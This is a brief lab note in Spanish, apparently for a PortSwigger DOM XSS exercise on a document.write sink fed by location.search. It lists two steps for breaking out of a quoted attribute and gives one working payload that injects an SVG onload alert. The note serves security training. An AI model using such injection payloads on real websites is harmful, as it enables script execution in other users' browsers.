Tags: #XSS #PortSwigger 
# Lab 3 DOM XSS in document.write sink using source location.search

```javaScript
// Para este tipo de ataque, debemos de buscar la manera de poder inyectar codigo JavaScript

1. Mirar el codigo fuente en donde estamos colocando texto
2. Ver la manera de poder cerrar alguna comilla para poder inyectar codigo JavaScript

"><svg/onload=alert(1)>
```
